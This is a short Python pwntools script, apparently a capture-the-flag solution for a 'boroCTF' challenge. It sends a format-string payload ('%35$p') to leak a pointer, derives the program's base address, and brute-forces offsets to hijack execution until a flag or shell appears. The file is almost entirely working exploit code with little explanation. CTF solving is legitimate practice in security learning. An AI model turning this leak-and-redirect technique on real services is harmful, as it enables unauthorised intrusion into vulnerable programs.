from pwn import *
import re

host = "w56ll430yihy.boroctf.com"
port = 47845

# for the first time use (0x1100, 0x1350, 0x10)
# second time use (0x1250, 0x1350, 0x1)
for off in range(0x1100, 0x1350, 0x10):
    io = remote(host, port)

    io.recvuntil(b"correctly.\n")
    io.sendline(b"%35$p")

    leak_line = io.recvline()
    m = re.search(rb"0x[0-9a-f]+", leak_line)
    if not m:
        io.close()
        continue

    leak = int(m.group(0), 16)
    pie = leak - 0x1209
    target = pie + off

    io.recvuntil(b"where do i go?\n")
    io.sendline(hex(target).encode())

    out = io.recvall(timeout=1)

    print(hex(off), hex(target), out[:100])

    if b"boroCTF" in out or b"flag" in out or b"shell" in out or b"{" in out:
        print(out)
        break

    io.close()